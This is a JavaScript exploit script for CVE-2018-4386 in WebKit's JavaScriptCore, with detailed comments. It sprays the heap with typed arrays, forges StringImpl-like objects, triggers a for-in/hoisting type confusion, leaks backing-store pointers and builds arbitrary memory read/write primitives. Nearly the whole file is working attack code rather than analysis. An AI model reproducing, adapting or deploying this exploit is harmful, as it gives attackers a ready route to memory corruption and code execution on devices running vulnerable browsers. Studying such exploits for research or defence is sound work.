/** Object used as a container for leaking addresses via type confusion */ 
var leaker_obj = {a: 0};
/** Typed array to hold leaked addresses from memory (Uint32Array for 32-bit chunks) */ 
var leaker_arr = new Uint32Array(6);

// ===========================================================
// Typed arrays used for arbitrary read/write primitives
// ===========================================================
/** Will be used as the backing store for out-of-bounds reads/writes */
var oob_slave = new Uint8Array(1024);
/** Controls the backing store pointer for oob_slave*/
var oob_master = new Uint32Array(7);

// Spray array to hold many Uint32Arrays to groom the heap and create predictable holes
var spray = [];

/**
 * Spray a single Uint32Array and store it in the spray array.
 * This is used to fill the heap with many objects of similar shape,
 * increasing the chances of predictable memory layout.
 */
function spray_one(i) {
    var x = new Uint32Array(1);
    // Assign a unique property to prevent deduplication and keep alive
    x[i + 'spray'] = 123;
    spray.push(x);
}

// Spray 0x10000 (65536) Uint32Arrays to groom the heap
for (var i = 0; i < 0x10000; i++)
    spray_one(i);

/** Target objects that will be used in the type confusion process */ 
var target = {
    a: 2.1100820415101592e-303, // m_hashAndFlags (or similar header field, usually a bitfield)
    b: false, // Padding or to fill boolean field in the internal struct
    c: true,  // Pointer field (e.g., m_data or similar)
    d: 5678   // m_length (string length field)
};

// A second target object similar to 'target' but with a different property 'e' instead of 'd'
// This is required to prevent crashes, possibly due to internal WebKit checks
var target2 = {a: 2.1100820415101592e-303, b: false, c: true, e: 5678};

/** Index used to create unique property names during impl creation */ 
var impl_idx = 0;

/**
 * Creates an object that mimics WTF::StringImpl structure in WebKit.
 * This object has a property 'a' set to 'target' and many dummy properties to
 * influence the internal structure and layout.
 * 
 * The exploit abuses type confusion on this object to gain memory corruption.
**/
function create_impl() {
    var ans = {a: target}; // 'a' corresponds to m_hashAndFlags in StringImpl
    // Add many dummy properties to control internal structure layout
    for (var i = 0; i < 32; i++)
        ans[(impl_idx++) + 'x'] = {};
    return ans;
}

/**
 * Triggers the CVE-2018-4386 vulnerability by exploiting hoisting and
 * for-in loop variable confusion.
 * 
 * @param {string} x - The string to overwrite the loop variable with.
 * @note The function corrupts the internal structure of 'impl.a' and checks if
 * @note the corruption was successful.
 * @note If successful, it sets up the arbitrary read/write primitives by swapping
 * @note backing stores of typed arrays.
 * */
function trigger(x) {
    // Sanity check that impl.a is still the expected target object
    if (impl.a != target) {
        print("wtf?"); // Unexpected state
        while (1); // Infinite loop to halt execution
    }

    var o = {a: 1}; // Object with property 'a', used in for-in loop

    // For-in loop over 'o', exploiting the hoisting bug
    for (var i in o) {{
            i = x;         // Overwrite loop variable with controlled string
            function i(){} // Hoisted function named 'i'
        }
        o[i]; // Access property with corrupted 'i', triggers type confusion
    }

    // Check if impl.a has been corrupted (no longer equal to target)
    if (impl.a != target) {
        print("corrupted!");
        print(typeof (impl.a)); // Should be 'object' after corruption
        print(impl.a.length);   // Should be 5678, confirming corruption

        // =============================
        // --- SETTING UP PRIMITIVES ---
        // =============================
        // Setup primitives by swapping backing stores of typed arrays for arbitrary R/W
        // Set target.c to leaker_obj and assign leaker_obj.a to itself
        // This prepares for addrof/fakeobj primitives
        target.c     = leaker_obj;
        leaker_obj.a = leaker_obj;
        // Save leaked addresses from impl.a's backing store pointers
        var l1       = impl.a[4];
        var l2       = impl.a[5];
        // Swap target.c to oob_slave (Uint8Array) for arbitrary memory read/write
        leaker_obj.a = oob_slave;
        var s1       = impl.a[4];
        var s2       = impl.a[5];
        // Restore target.c to leaker_arr for addrof/fakeobj
        target.c     = leaker_arr;
        impl.a[4]    = l1;
        impl.a[5]    = l2;
        // Setup oob_master backing store pointers for arbitrary R/W
        target.c     = oob_master;
        impl.a[4]    = s1;
        impl.a[5]    = s2;
        // Restore impl.a to original target to maintain consistency
        impl.a       = target;
        print([l1, l2, s1, s2]); // Debug print of backing store pointers
        throw "exploit fucking finished"; // Signal exploit success and halt
    }
}

try {
    // Attempt to trigger the bug multiple times to increase success chance
    for (var _ = 0; _ < 1024; _++) {
        var impl = create_impl(); // Create fake StringImpl object
        var s = {a: impl};        // Wrap impl in another object
        trigger(s);               // Trigger vulnerability with wrapped object
    }
} catch (e) {
    print("error: " + e); // Catch exploit success or failure
}
